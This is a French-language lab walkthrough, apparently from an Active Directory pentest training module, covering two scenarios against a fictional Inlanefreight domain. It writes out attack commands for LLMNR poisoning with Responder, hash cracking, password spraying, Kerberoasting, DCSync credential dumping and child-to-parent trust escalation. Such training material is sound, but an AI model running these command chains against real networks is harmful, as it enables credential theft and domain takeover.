# Skills Assessment

Deux scenarios d'evaluation qui couvrent l'ensemble de la chaine d'attaque AD, de l'enumeration initiale sans identifiants jusqu'a la compromission du domaine. L'objectif est de mettre en pratique toutes les techniques vues dans ce module dans un environnement realiste.

## Scenario 1 : du foothold au Domain Admin

### Situation

On est positionne sur le reseau interne d'Inlanefreight avec un hote d'attaque Linux et un poste Windows. Aucun identifiant n'est fourni. L'objectif est de compromettre le domaine en partant de zero.

### Approche

```bash
# Phase 1 : Enumeration sans identifiants

# 1 - Ecoute passive + poisoning
sudo responder -I eth0 -wFb

# 2 - En parallele, enumeration active
sudo nmap -sn 172.16.5.0/23
sudo nmap -sC -sV -p 53,88,135,389,445,636 172.16.5.5

# 3 - Tenter les sessions NULL
enum4linux-ng -A 172.16.5.5
crackmapexec smb 172.16.5.5 --pass-pol

# 4 - Enumeration Kerberos
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt
```

```bash
# Phase 2 : Obtenir un foothold

# Option A : hash capture via Responder
hashcat -m 5600 hash.txt /opt/wordlists/rockyou.txt

# Option B : password spraying
kerbrute passwordspray -d INLANEFREIGHT.LOCAL \
    --dc 172.16.5.5 valid_users.txt 'Welcome1'
```

```bash
# Phase 3 : Enumeration authentifiee

# 1 - BloodHound
bloodhound-python -u '<USER>' -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL \
    -ns 172.16.5.5 -c All

# 2 - Kerberoasting
GetUserSPNs.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' \
    -dc-ip 172.16.5.5 -request

# 3 - Chercher les misconfigurations
crackmapexec smb 172.16.5.0/23 -u '<USER>' -p '<PASSWORD>' --shares
crackmapexec smb 172.16.5.5 -u '<USER>' -p '<PASSWORD>' -M gpp_password
```

```bash
# Phase 4 : Escalade vers DA

# Suivre les chemins BloodHound :
# - ACL abuse (GenericAll, WriteDACL)
# - Kerberoasting d'un compte privilegie
# - Mouvement lateral via admin local
# - DCSync

# DCSync final
secretsdump.py INLANEFREIGHT.LOCAL/'<DA>':'<PASSWORD>'@172.16.5.5
```

{% hint style="info" %}
Chaque environnement AD est different. L'ordre exact des attaques depend des decouvertes. La cle est de documenter chaque etape et de revenir a l'enumeration apres chaque nouvel identifiant obtenu.
{% endhint %}

## Scenario 2 : multi-domaine et approbations

### Situation

Le domaine INLANEFREIGHT.LOCAL est compromis. L'objectif est d'identifier les approbations de domaine et d'escalader vers le domaine parent ou les forets liees.

### Approche

```bash
# Phase 1 : Identifier les approbations

# Depuis Linux
ldapsearch -x -H ldap://172.16.5.5 -D '<DA>@INLANEFREIGHT.LOCAL' \
    -w '<PASSWORD>' -b "CN=System,DC=INLANEFREIGHT,DC=LOCAL" \
    "(objectClass=trustedDomain)" cn trustDirection trustType
```

```powershell
# Depuis Windows
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-DomainTrustMapping
nltest /domain_trusts /all_trusts
```

```bash
# Phase 2 : Escalade child-to-parent

# 1 - DCSync du domaine enfant (krbtgt)
secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/'<DA>':'<PASSWORD>'@<IP_DC_CHILD> \
    -just-dc-user krbtgt

# 2 - Obtenir les SIDs necessaires
lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/'<DA>':'<PASSWORD>'@<IP_DC_PARENT>

# 3 - raiseChild (automatise tout)
raiseChild.py LOGISTICS.INLANEFREIGHT.LOCAL/'<DA>':'<PASSWORD>' \
    -target-exec <IP_DC_PARENT>
```

```bash
# Phase 3 : Cross-forest (si applicable)

# Tester les credentials dans l'autre foret
crackmapexec smb <IP_DC_FORET_B> -u '<USER>' -p '<PASSWORD>'

# Kerberoasting cross-domain
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL \
    INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' -request
```

## Ce qu'on en retient

### Checklist de pentest AD

- [ ] Enumeration passive (Responder -A, Wireshark)
- [ ] Decouverte des hotes et du DC
- [ ] Enumeration sans identifiants (SMB NULL, LDAP anon, Kerberos)
- [ ] Capture de hashes (Responder actif)
- [ ] Password spraying (apres politique MDP)
- [ ] Enumeration authentifiee (BloodHound, PowerView, CrackMapExec)
- [ ] Kerberoasting et ASREPRoasting
- [ ] Audit des ACL (BloodHound, PowerView)
- [ ] Recherche de misconfigurations (GPP, descriptions, delegations)
- [ ] Exploitation des chemins BloodHound
- [ ] DCSync
- [ ] Enumeration des approbations
- [ ] Escalade child-to-parent (si applicable)
- [ ] Tests de vulnerabilites recentes (NoPac, PrintNightmare)
- [ ] Audit defensif (PingCastle) et recommandations

### Erreurs courantes a eviter

| Erreur | Consequence | Solution |
|---|---|---|
| Sprayer sans connaitre la politique MDP | Verrouillage massif de comptes | Toujours recuperer la politique en premier |
| Ne pas documenter les etapes | Rapport incomplet | Noter chaque commande et chaque resultat |
| Ignorer les chemins non-DA | Passer a cote de donnees sensibles | Les partages, les emails, les BDD sont aussi des objectifs |
| Ne pas nettoyer | Backdoors laissees chez le client | Reverter chaque modification d'ACL/groupe/SPN |
| Oublier les approbations | Rater l'escalade inter-domaine | Toujours enumerer les trusts apres le DCSync |

***
